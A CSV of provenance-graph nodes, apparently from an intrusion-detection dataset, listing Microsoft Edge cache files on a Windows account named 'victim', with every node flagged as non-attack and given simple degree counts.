uuid,annotation,node_order,is_attack_node,in_degree_subgraph,out_degree_subgraph,total_degree_subgraph,in_degree_full,out_degree_full,total_degree_full
c3a31b13-0d96-48be-ae99-513320515884,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\05f9117ade39b35b_1'},478,False,1,0,1,1,0,1
c4d4503d-7dcb-423b-beb6-bb3988fa99a5,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\f486e12e583a64a3_0'},479,False,1,0,1,1,0,1
74ae047a-603b-442e-bab6-4104dc6ae157,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\f486e12e583a64a3_1'},480,False,1,0,1,1,0,1
7aa98c83-2522-4dfc-b1ed-d0d3d86b2c7c,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\aab84a2afd7db001_0'},481,False,1,0,1,1,0,1
9125cc7f-9459-44ab-b760-eed979fc4d8e,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\aab84a2afd7db001_1'},482,False,1,0,1,1,0,1
7db08386-820d-4196-b681-355801b26014,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\4791ae0cd91edb21_0'},483,False,1,0,1,1,0,1
3480ad11-2c5b-409c-a7b9-4e712de98cc5,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\4791ae0cd91edb21_1'},484,False,1,0,1,1,0,1
1a1e4eba-3dac-4bc3-a3d6-f44f4023ee66,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\725351b01813be96_0'},485,False,1,0,1,1,0,1
4f60aae6-d7db-4eff-b291-1b3c846f0474,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\725351b01813be96_1'},486,False,1,0,1,1,0,1
da9fe3e2-949b-4381-8dd8-d7a7eacabc7e,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\711e1c98a878ba06_0'},487,False,1,0,1,1,0,1
2ee45ebd-70cb-4cc4-982c-378184bbeeb4,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\711e1c98a878ba06_1'},488,False,1,0,1,1,0,1
12729614-a6c8-49da-9e08-b023e589476f,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000b5'},489,False,1,0,1,1,0,1
75c7dbba-3542-44ef-ac01-ee13eecc662a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\ba677b3476b674a1_0'},491,False,1,0,1,1,0,1
f1c446a1-ff89-4c89-bb6e-32902e6de1b3,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\ba677b3476b674a1_1'},492,False,1,0,1,1,0,1
b762709e-4d38-4981-a3da-6428a02e9a8d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\e55fd7ab7991699f_0'},493,False,1,0,1,1,0,1
e1dd175b-7a2f-40e7-ad68-aecd6bd303a2,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\e55fd7ab7991699f_1'},494,False,1,0,1,1,0,1
80cc9342-8bb7-4eb5-968f-9bab4ceea1f4,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000b6'},495,False,1,0,1,1,0,1
32654dbd-33ac-486d-92b5-6d156976bd53,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\0e998b40bb567c95_0'},496,False,1,0,1,1,0,1
366bfc2c-3dd6-4b7d-8c8c-72f817d2647d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\0e998b40bb567c95_1'},497,False,1,0,1,1,0,1
dc43e373-bdad-453c-b71f-ff93208c2a38,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\296acc1cd0ef4ba9_0'},498,False,1,0,1,1,0,1
9946afa4-c5c9-4737-b36a-e0cb5a568df4,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\296acc1cd0ef4ba9_1'},499,False,1,0,1,1,0,1
26924474-a0c6-446e-a38a-fe7abde61730,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\a54706d77db92867_0'},500,False,1,0,1,1,0,1
924da501-6d26-482b-a5dc-0487a51490b7,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\a54706d77db92867_1'},501,False,1,0,1,1,0,1
04f1774f-5f32-422e-a0f1-3492df8e229f,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\d56a60de56c54c7e_0'},502,False,1,0,1,1,0,1
e796089f-d1f0-4e57-a236-6a0e7916d444,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\d56a60de56c54c7e_1'},503,False,1,0,1,1,0,1
1cda0282-b396-4f98-9f4d-4473121bc8af,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000b7'},504,False,1,0,1,1,0,1
a3827bd1-7327-4dd2-b6b2-5bf2e1dbe9b5,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\24ff8575c320fbd3_0'},505,False,1,0,1,1,0,1
f54f804b-4b1e-4b0f-a9c2-f6afcd855ed4,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\24ff8575c320fbd3_1'},506,False,1,0,1,1,0,1
baccde89-f89e-48ef-bcc9-a310e3cb556a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\8118e8ec8ccd53c9_0'},507,False,1,0,1,1,0,1
42aa6003-4e82-4fbc-9cdb-e5a9026860a3,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\8118e8ec8ccd53c9_1'},508,False,1,0,1,1,0,1
ec29f39f-99c9-457f-860c-6718be8622c6,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\ec81a333e9733a05_0'},509,False,1,0,1,1,0,1
458771c9-b656-4186-87ea-28ad1377a13a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\ec81a333e9733a05_1'},510,False,1,0,1,1,0,1
b0b4de90-0c18-4a04-95b3-9c53d0409e0c,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\92bb7dd17f619813_0'},511,False,1,0,1,1,0,1
085315f8-49fa-43b3-badb-c873672ef019,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\92bb7dd17f619813_1'},512,False,1,0,1,1,0,1
ae268423-0e3a-4853-8712-76d8258d5dff,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\60a6414e5abe9eb0_0'},513,False,1,0,1,1,0,1
32f8ebef-0721-4b0f-8f5b-0fcbe4d800e4,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\60a6414e5abe9eb0_1'},514,False,1,0,1,1,0,1
247484f6-ad30-4e0a-8f9b-8cbf17f50cae,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\fef32661d2bf7540_0'},515,False,1,0,1,1,0,1
bbc7445e-3772-474b-ba84-27a5998848c8,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\fef32661d2bf7540_1'},516,False,1,0,1,1,0,1
bfe8ecdb-5223-4804-969f-6e5c2574d3d2,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\c88691ee87435bea_0'},517,False,1,0,1,1,0,1
f531f25a-f704-43ed-993c-3cef4f28c5ee,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\c88691ee87435bea_1'},518,False,1,0,1,1,0,1
08cadd80-d8dd-4398-99ad-d28c9757e4cf,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\8fb4d03f61800323_0'},519,False,1,0,1,1,0,1
470bfda6-0a1e-4693-9f1d-8d397858fa64,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\8fb4d03f61800323_1'},520,False,1,0,1,1,0,1
2731ef30-751d-45a4-8183-5dd63505bf89,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\f0ce427b28da7d25_0'},521,False,1,0,1,1,0,1
a96f6348-d032-4047-bc30-3d8fc907c23f,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\34d467f947acad13_0'},522,False,1,0,1,1,0,1
f3a6eb2b-a03e-419a-aca4-516243b3e8bb,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\872b7b4f8bfb485b_0'},523,False,1,0,1,1,0,1
b97d1a65-858f-46ae-9de7-76ee955357e4,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\f7a02825bf690a95_0'},524,False,1,0,1,1,0,1
4147aa41-5046-4c77-a588-25a5419e70e1,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\65f701fc2d3b6d77_0'},525,False,1,0,1,1,0,1
ecc47b11-3f10-432f-8971-5287f4cda523,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\960aaafa77fbb8a0_0'},526,False,1,0,1,1,0,1
a6a61acf-ac59-4063-81f5-a80a729442b0,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\b849a2f19789767a_0'},527,False,1,0,1,1,0,1
2b319ca4-276d-4b5e-897e-6266230531fa,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\67f1189172319be9_0'},528,False,1,0,1,1,0,1
a2fd6582-1342-4e28-a1b9-82afbe445220,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\e6504c209cb882d7_0'},529,False,1,0,1,1,0,1
c0e91c2d-f4b0-4142-98bb-d777fb5d7cac,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\df9f3044c9ae2e2e_0'},530,False,1,0,1,1,0,1
a7c077e7-ddf5-47e2-9dec-aaa71c83f614,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\3055e34b33d94a7f_0'},531,False,1,0,1,1,0,1
771d9716-3ff0-4c04-b197-9f03fa37950c,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\ea6f02895a4e3500_0'},532,False,1,0,1,1,0,1
aa79e986-e9de-4d9e-9ee2-0852889232a1,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\7c4863577c43b32f_0'},533,False,1,0,1,1,0,1
83661f13-4651-45fe-9e0e-e37779e8763c,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\574b540795aeca12_0'},534,False,1,0,1,1,0,1
b2c88380-dff8-43ee-846e-728df45c0635,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\9edf5f432f2b01a8_0'},535,False,1,0,1,1,0,1
b769382a-9394-4aaa-9729-c851f3e88154,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\2a15b98971354678_0'},536,False,1,0,1,1,0,1
74d95817-c177-4365-801b-6183a1f0c370,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\0a67355f432340b9_0'},537,False,1,0,1,1,0,1
8fdf99eb-fad0-4fe8-9300-9ef46ed1239e,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\b9dcc9f4c807eeaa_0'},538,False,1,0,1,1,0,1
52ea1a6c-89c0-4383-8eb7-63b1d12226e5,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\321e64ecacb66619_0'},539,False,1,0,1,1,0,1
c7847964-d415-4afd-bb7d-1a29655531d9,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\153bba9a429a2c40_0'},540,False,1,0,1,1,0,1
9babb898-c71c-45b5-8cff-962bea10c5a4,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\2e08a9c6ec333021_0'},541,False,1,0,1,1,0,1
17a31b62-2282-45f1-8265-7553cb76afd1,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\39c763e560200cda_0'},542,False,1,0,1,1,0,1
dc26ead9-e24e-45ad-a3a7-9174d804ab30,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\6dcb70bdb8fe40a3_0'},543,False,1,0,1,1,0,1
9e330fb5-86b3-4abc-935c-88c6178b1d25,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\7ed93a10144ac834_0'},544,False,1,0,1,1,0,1
d1fe79c7-dfe2-42b7-b206-96818ba7c69c,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\264b46d61d915def_0'},545,False,1,0,1,1,0,1
48aeb63d-94df-4d8d-b82b-03a404203068,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\b7cd751a99c70c48_0'},546,False,1,0,1,1,0,1
6621b1f5-2278-4f6a-a811-8c67db039363,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\13e83bd1c1ab1541_0'},547,False,1,0,1,1,0,1
359ae1e3-0318-48a6-89bb-85b41e4c1804,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\8fdcb7992c9e741c_0'},548,False,1,0,1,1,0,1
f46e820f-58b0-4755-8585-8e19b68c14a2,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\ff5222d57552b6c1_0'},549,False,1,0,1,1,0,1
c2301eeb-ed86-487c-9d68-ef41f5994051,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\b87cf2f2b0511c4c_0'},550,False,1,0,1,1,0,1
434b321a-84e3-4844-801b-7b13e00e030e,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\dd1d9f7425e5aefb_0'},551,False,1,0,1,1,0,1
295e7a45-54ff-42bd-98b0-b0f99c8e4600,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\348aae4f13c8f553_0'},552,False,1,0,1,1,0,1
57f08c04-f588-4792-b151-a96d4ae57d3c,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\8cce886514f2b2ec_0'},553,False,1,0,1,1,0,1
f62eb344-847e-4640-b2b8-483293c1bb10,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\217bbc87393d2e57_0'},554,False,1,0,1,1,0,1
1c33d183-1260-4895-ab86-7297e181a6c2,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\8bfc77f05f6a3cc5_0'},555,False,1,0,1,1,0,1
27bd3fbd-b5d3-4721-a3ef-2f23dae1ec23,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\2a99e21c738e2a0b_0'},556,False,1,0,1,1,0,1
5e0daae7-8660-49df-b155-9d8cc1c1b157,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\d6af3918ca46ca94_0'},557,False,1,0,1,1,0,1
b0236bb8-4f4b-4b78-bc79-391f7998614c,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\85f220494be669b7_0'},558,False,1,0,1,1,0,1
